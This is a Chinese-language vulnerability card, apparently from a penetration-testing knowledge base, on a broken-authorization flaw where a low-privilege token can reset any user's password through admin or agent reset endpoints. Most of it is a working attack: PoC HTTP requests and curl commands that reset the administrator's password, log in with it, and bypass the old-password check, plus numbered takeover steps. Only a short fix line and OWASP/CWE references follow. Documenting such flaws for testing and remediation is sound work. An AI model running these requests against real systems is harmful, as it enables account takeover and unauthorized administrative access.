---
title: 后台“重置任意用户密码”接口越权（直接接管会员/管理员）
cve: 无（业务逻辑）
severity: critical
cvss: 9.2
product: 自研后台（会员管理/代理管理）
versions: 任意
ports: 80, 443
keywords: 重置密码, 任意用户, 越权, 后台, 接管
entry: /api/admin/user/resetPassword  /api/agent/resetPwd
verified: false
sources: 公开资料整理（业务逻辑类，无 CVE）
---

## 指纹

```
POST /api/admin/user/resetPassword {"uid":1001,"password":"..."}
POST /api/user/updatePwd            {"uid":...,"oldPwd":"","newPwd":"..."}
```

## 前置条件

- 低权后台账号（客服/代理）或普通会员 token。

## PoC

```http
### 1) 低权账号尝试重置他人
POST /api/admin/user/resetPassword HTTP/1.1
Authorization: Bearer <低权token>

{"uid":1,"password":"Passw0rd!2026"}
```

```bash
# 2) 命中判定：用新口令登录目标账号
curl -s -X POST 'https://target/api/login' -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"Passw0rd!2026"}' | head -c 200

# 3) 若接口校验 oldPwd，传空或省略
curl -s -X POST 'https://target/api/user/updatePwd' -H "Authorization: Bearer <t>" \
  -H 'Content-Type: application/json' -d '{"uid":1,"newPwd":"Passw0rd!2026"}'
```

## 利用步骤

1. 先用自己的账号验证接口行为（改自己）；
2. 换 uid 改目标；命中即接管管理员；
3. 改完立刻记录并回滚（把口令改回去），避免影响业务；
4. 证据：重置请求 + 用新口令登录成功。

## 修复与缓解

- 重置接口限超管 + 二次认证 + 审计；禁止请求体指定 uid（从 token 取）。

## 参考

- OWASP API5 BFLA；CWE-639。
